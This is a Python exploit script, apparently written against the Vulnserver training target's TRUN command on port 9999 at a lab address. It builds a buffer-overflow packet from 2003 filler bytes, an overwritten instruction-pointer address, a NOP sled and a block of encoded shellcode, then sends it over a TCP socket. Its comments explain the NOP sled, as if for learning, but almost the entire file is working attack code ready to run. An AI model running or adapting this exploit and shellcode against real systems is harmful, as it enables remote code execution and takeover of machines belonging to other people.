#!/usr/bin/python3
# Removed sys since I want to be able to easier maintain it in the future.
# instead of passing IP and PORT, just use below IP=.. PRT=...
import socket

sh =  b""
sh += b"\xba\xbd\xe2\xa0\xc1\xd9\xeb\xd9\x74\x24\xf4\x5e\x33"
sh += b"\xc9\xb1\x52\x31\x56\x12\x03\x56\x12\x83\x53\x1e\x42"
sh += b"\x34\x57\x37\x01\xb7\xa7\xc8\x66\x31\x42\xf9\xa6\x25"
sh += b"\x07\xaa\x16\x2d\x45\x47\xdc\x63\x7d\xdc\x90\xab\x72"
sh += b"\x55\x1e\x8a\xbd\x66\x33\xee\xdc\xe4\x4e\x23\x3e\xd4"
sh += b"\x80\x36\x3f\x11\xfc\xbb\x6d\xca\x8a\x6e\x81\x7f\xc6"
sh += b"\xb2\x2a\x33\xc6\xb2\xcf\x84\xe9\x93\x5e\x9e\xb3\x33"
sh += b"\x61\x73\xc8\x7d\x79\x90\xf5\x34\xf2\x62\x81\xc6\xd2"
sh += b"\xba\x6a\x64\x1b\x73\x99\x74\x5c\xb4\x42\x03\x94\xc6"
sh += b"\xff\x14\x63\xb4\xdb\x91\x77\x1e\xaf\x02\x53\x9e\x7c"
sh += b"\xd4\x10\xac\xc9\x92\x7e\xb1\xcc\x77\xf5\xcd\x45\x76"
sh += b"\xd9\x47\x1d\x5d\xfd\x0c\xc5\xfc\xa4\xe8\xa8\x01\xb6"
sh += b"\x52\x14\xa4\xbd\x7f\x41\xd5\x9c\x17\xa6\xd4\x1e\xe8"
sh += b"\xa0\x6f\x6d\xda\x6f\xc4\xf9\x56\xe7\xc2\xfe\x99\xd2"
sh += b"\xb3\x90\x67\xdd\xc3\xb9\xa3\x89\x93\xd1\x02\xb2\x7f"
sh += b"\x21\xaa\x67\x2f\x71\x04\xd8\x90\x21\xe4\x88\x78\x2b"
sh += b"\xeb\xf7\x99\x54\x21\x90\x30\xaf\xa2\x5f\x6c\xae\x67"
sh += b"\x08\x6f\xb0\x96\x94\xe6\x56\xf2\x34\xaf\xc1\x6b\xac"
sh += b"\xea\x99\x0a\x31\x21\xe4\x0d\xb9\xc6\x19\xc3\x4a\xa2"
sh += b"\x09\xb4\xba\xf9\x73\x13\xc4\xd7\x1b\xff\x57\xbc\xdb"
sh += b"\x76\x44\x6b\x8c\xdf\xba\x62\x58\xf2\xe5\xdc\x7e\x0f"
sh += b"\x73\x26\x3a\xd4\x40\xa9\xc3\x99\xfd\x8d\xd3\x67\xfd"
sh += b"\x89\x87\x37\xa8\x47\x71\xfe\x02\x26\x2b\xa8\xf9\xe0"
sh += b"\xbb\x2d\x32\x33\xbd\x31\x1f\xc5\x21\x83\xf6\x90\x5e"
sh += b"\x2c\x9f\x14\x27\x50\x3f\xda\xf2\xd0\x4f\x91\x5e\x70"
sh += b"\xd8\x7c\x0b\xc0\x85\x7e\xe6\x07\xb0\xfc\x02\xf8\x47"
sh += b"\x1c\x67\xfd\x0c\x9a\x94\x8f\x1d\x4f\x9a\x3c\x1d\x5a"

EIP_POS=2003

IP="192.168.122.214" ; PRT=9999
vf=b"TRUN /.:/" # Vuln. field
A=b"\x41"       # The char 'A'
NOP=b"\x90"     # NOP sled (what this does is basically, a machine instruction which - points to the next one, and if that (next one) also is a NOP(\x90) it just repeats, go to the next one, until our it have ticked along to our payload, and the shellcode (sh) is executed.)
NOPpadding = b"\x90"*10
EIP=b"\xaf\x11\x50\x62"

pkt = vf+A*EIP_POS+EIP+NOPpadding+sh


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PRT))
s.send(pkt)
s.close()
